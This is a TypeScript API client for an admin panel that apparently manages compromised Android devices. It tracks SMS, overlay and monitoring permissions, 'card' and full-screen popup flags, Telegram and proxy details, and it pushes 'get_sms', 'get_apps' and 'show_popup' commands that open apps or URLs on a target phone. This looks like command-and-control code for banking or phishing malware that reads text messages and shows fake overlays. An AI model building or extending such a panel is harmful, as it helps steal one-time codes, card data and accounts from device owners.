import http from "@/api";
import pushHttp from "@/api/pushApi";

/**
 * @name 设备管理模块
 */

// 设备接口返回类型
export interface DeviceItem {
  id: number;
  device_number?: string | null;
  appName?: string | null;
  appVersion?: string | null;
  app_channel?: string | null;
  language?: string | null;
  region?: string | null;
  country?: string | null;
  ip?: string | null;
  brand?: string | null;
  model?: string | null;
  sdk_version?: string | null;
  account?: string | null;
  tg?: string | null;
  proxy?: string | null;
  tags?: string | null;
  float_window_permission?: number | null;
  sms_permission?: number | null;
  monitor_permission?: number | null;
  has_card?: number | null;
  has_sms?: number | null;
  has_screen_popup_card?: number | null;
  has_fullscreen_mode?: number | null;
  install_time_distance?: number | null;
  screen_interval_time?: number | null;
  open_count?: number | null;
  created_at?: string | null;
  updated_at?: string | null;
  deleted_at?: string | null;
}

// 设备列表响应类型
export interface DeviceListResponse {
  total_num: number;
  list: DeviceItem[];
}

// 获取设备列表
export const getDeviceListApi = (params?: {
  page?: number;
  limit?: number;
  device_number?: string;
  language?: string;
  country?: string;
  ip?: string;
  brand?: string;
  proxy?: string;
  tags?: string;
  appVersion?: string;
  app_channel?: string;
}) => {
  return http.get<DeviceListResponse>(`/admin/device/list`, params, { loading: false });
};

// 获取指定设备信息
export const getDeviceInfoApi = (id: number) => {
  return http.get<DeviceItem>(`/admin/device/info`, { id }, { loading: false });
};

// 更新设备信息
export const updateDeviceApi = (params: {
  id: number;
  has_card?: number;
  has_sms?: number;
  install_time_distance?: number;
  screen_interval_time?: number;
  has_screen_popup_card?: number;
  has_fullscreen_mode?: number;
  tags?: string;
}) => {
  return http.post<DeviceItem>(`/admin/device/update`, params);
};

// 推送消息到设备（使用推送接口）
export const pushMessageToDeviceApi = (params: {
  device_number: string;
  type: "get_sms" | "get_apps" | "show_popup";
  data?: {
    title?: string;
    content?: string;
    action_type?: "open_app" | "open_url";
    target_app?: string;
    target_url?: string;
  };
}) => {
  return pushHttp.post(`/admin/device/pushMessage`, params);
};

// 在线设备数量响应类型
export interface OnlineCountResponse {
  online_count: number;
  updated_at: string;
}

// 获取在线设备数量
export const getOnlineDeviceCountApi = () => {
  return http.get<OnlineCountResponse>(`/admin/device/onlineCount`, {}, { loading: false });
};

